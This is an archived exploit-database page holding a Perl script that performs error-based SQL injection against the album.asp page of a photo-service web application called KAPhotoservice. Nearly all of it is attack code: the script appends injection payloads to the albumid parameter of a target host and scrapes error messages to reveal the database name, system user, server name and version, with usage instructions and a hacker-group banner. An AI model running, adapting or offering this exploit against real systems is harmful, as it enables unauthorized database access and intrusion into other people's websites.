<html><head><title>KAPhotoservice (album.asp) Remote SQL Injection Exploit</title></head><pre>--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
--==+                KAPhotoservice (album.asp) Remote SQL Injection Exploit             +==--
--==+====================================================================================+==--
                     [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]

[+] Info:

[~] Software: KAPhotoservice (Payment)
[~] Demo: http://www.kaphotoservice.com/photoservice/
[~] Exploit: Remote SQL Injection [High]
[~] Bug Found By: JosS
[~] Contact: sys-project[at]hotmail.com
[~] Web: http://www.spanish-hackers.com
[~] Vuln File: album.asp

[+] Exploit:

#!/usr/bin/perl

# KAPhotoservice - Remote SQL Injection Exploit
# Code by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team
# www.spanish-hackers.com

use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

sub lw
{

my $SO = $^O;
my $linux = &quot;&quot;;
if (index(lc($SO),&quot;win&quot;)!=-1){
		   $linux=&quot;0&quot;;
	    }else{
		    $linux=&quot;1&quot;;
	    }
		if($linux){
system(&quot;clear&quot;);
}
else{
system(&quot;cls&quot;);
system (&quot;title KAPhotoservice - Remote SQL Injection Exploit&quot;);
system (&quot;color 02&quot;);
}

}

#*************************** expl ******************************


&amp;lw;

print &quot;\t\t########################################################\n\n&quot;;
print &quot;\t\t#    KAPhotoservice - Remote SQL Injection Exploit     #\n\n&quot;;
print &quot;\t\t#                        by JosS                       #\n\n&quot;;
print &quot;\t\t########################################################\n\n&quot;;


$host=$ARGV[0];
chop $host;
$host=$host.&quot;/album.asp?cat=&amp;apage=&amp;albumid=&quot;;

if(!$ARGV[0]) {
    print &quot;\n[x] KAPhotoservice - Remote SQL Injection Exploit\n&quot;;
    print &quot;[x] written by JosS - sys-project[at]hotmail.com\n&quot;;
    print &quot;[x] usage: perl $0 [host]\n&quot;;
    print &quot;[x] example: http://host.com/PHPWebquest\n&quot;;
    exit(1);
 }

@comando=(&quot;1+and+1=convert(int,db_name())&quot;,&quot;1+and+1=convert(int,system_user)&quot;,&quot;1+and+1=convert(int,\@\@servername)--&quot;,'1+and+1=convert(int,@@version)--');


for ($i=0;$i&lt;=3;$i++)

{

my $final = $host.$comando[$i];
my $ua = LWP::UserAgent-&gt;new;
my $req = HTTP::Request-&gt;new(GET =&gt; $final);
$doc = $ua-&gt;request($req)-&gt;as_string;

if ( $doc =~ /Syntax\s(.*)&lt;\/font&gt;/mosix )
{

if ($comando[$i] eq &quot;1+and+1=convert(int,db_name())&quot;)
{

print &quot;db_name:\n&quot;;

$dbname = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print &quot;$dbname\n\n&quot;;

}

if ($comando[$i] eq &quot;1+and+1=convert(int,system_user)&quot;)

{

print &quot;system_user:\n&quot;;

$systemuser = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print &quot;$systemuser\n\n&quot;;

}

if ($comando[$i] eq &quot;1+and+1=convert(int,\@\@servername)--&quot;)

{

print &quot;servername:\n&quot;;

$servername = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print &quot;$servername\n\n&quot;;

}

if ($comando[$i] eq '1+and+1=convert(int,@@version)--')

{

print &quot;version:\n&quot;;

$version = $1 if ($doc =~ /.*?value\s'(.*?)'\sto.*/sm);
print &quot;$version\n\n&quot;;

}

} # Cierre del if principal
} # cierre for


--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
--==+                                       JosS                                         +==--
--==+====================================================================================+==--
                                       [+] [The End]

# milw0rm.com [2008-03-18]</pre></html>